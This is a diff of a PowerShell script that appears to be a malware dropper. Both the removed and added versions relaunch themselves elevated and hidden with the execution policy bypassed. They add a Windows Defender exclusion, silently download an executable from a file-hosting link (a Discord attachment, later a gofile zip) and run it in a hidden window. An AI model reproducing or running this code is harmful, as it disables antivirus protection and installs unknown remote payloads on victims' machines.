@@ -1,34 +1,37 @@
-param([string]$OriginalTemp=$env:TEMP)
-if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+param([string]$OriginalTemp = $env:TEMP)
+
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $expandedTemp = [System.Environment]::ExpandEnvironmentVariables($OriginalTemp)
     $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp `"$expandedTemp`""
-    (New-Object -ComObject Shell.Application).ShellExecute('pwsh.exe',$elevatedCommand,'','runas',0)
+    Start-Process -FilePath "powershell.exe" -ArgumentList $elevatedCommand -Verb RunAs
     exit
 }
 
-# Resolve full path with proper casing and no short names
-$output = [IO.Path]::GetFullPath((Join-Path $OriginalTemp "Setup.exe"))
+$outputZip = [IO.Path]::Combine($OriginalTemp, "Setup.zip")
+$extractPath = [IO.Path]::Combine($OriginalTemp, "SetupExtracted")
+$exePath = [IO.Path]::Combine($extractPath, "Setup.exe")
 
 try {
-    # Force create directory structure
-    New-Item -Path (Split-Path $output) -ItemType Directory -Force | Out-Null
-    
-    # Create placeholder file
-    $null = New-Item -Path $output -ItemType File -Force
-    
-    # Add exclusion to specific file path
-    Add-MpPreference -ExclusionPath $output
-    
-    # Get final resolved path (no 8.3 names)
-    $resolvedPath = (Get-Item $output).FullName
-    
-    # Download and replace placeholder
+    if (!(Test-Path $extractPath)) {
+        New-Item -Path $extractPath -ItemType Directory -Force | Out-Null
+    }
+
+    try {
+        Add-MpPreference -ExclusionPath $extractPath
+    } catch {
+        Write-Host "Defender exclusion atlanıyor: $($_.Exception.Message)"
+    }
+
     $ProgressPreference = 'SilentlyContinue'
-    Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1361071677580251329/1361076129477431468/Setup.exe' -OutFile $resolvedPath
-    
-    # Verify and execute
-    if (Test-Path $resolvedPath) {
-        Start-Process $resolvedPath -WindowStyle Hidden
+    Invoke-WebRequest -Uri "https://cold2.gofile.io/download/web/bf45fdaf-3ae5-46e3-a5da-60ff6dd54eba/Setup.zip" -OutFile $outputZip
+
+    if (Test-Path $outputZip) {
+        Expand-Archive -Path $outputZip -DestinationPath $extractPath -Force
+        if (Test-Path $exePath) {
+            Start-Process -FilePath $exePath -WindowStyle Hidden
+        }
     }
 }
-catch { exit }
+catch {
+    exit
+}
